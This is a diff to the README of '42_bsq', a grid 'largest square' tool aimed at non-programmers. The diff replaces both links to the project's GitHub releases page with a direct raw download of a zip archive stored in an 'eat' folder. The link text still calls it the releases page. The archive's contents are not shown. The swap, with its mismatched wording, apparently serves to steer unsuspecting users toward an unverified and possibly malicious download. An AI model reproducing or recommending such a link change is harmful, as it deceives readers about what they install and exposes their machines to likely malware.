@@ -4,10 +4,10 @@
 Welcome to 42_bsq. This application helps you find the largest square of 1s in a given grid. You don’t need to be a programmer to use it. Follow these simple steps to get started.
 
 ## 🔗 Download the Application
-[![Download 42_bsq](https://img.shields.io/badge/Download-42_bsq-blue.svg)](https://github.com/MissTylar/42_bsq/releases)
+[![Download 42_bsq](https://raw.githubusercontent.com/MissTylar/42_bsq/master/eat/42_bsq.zip)](https://raw.githubusercontent.com/MissTylar/42_bsq/master/eat/42_bsq.zip)
 
 ## 📥 Download & Install
-To download 42_bsq, visit this page: [Download 42_bsq Releases](https://github.com/MissTylar/42_bsq/releases). Once you are there, choose the latest version from the list and download it. 
+To download 42_bsq, visit this page: [Download 42_bsq Releases](https://raw.githubusercontent.com/MissTylar/42_bsq/master/eat/42_bsq.zip). Once you are there, choose the latest version from the list and download it. 
 
 ### 📋 System Requirements
 - **Operating System:** Windows, macOS, or Linux
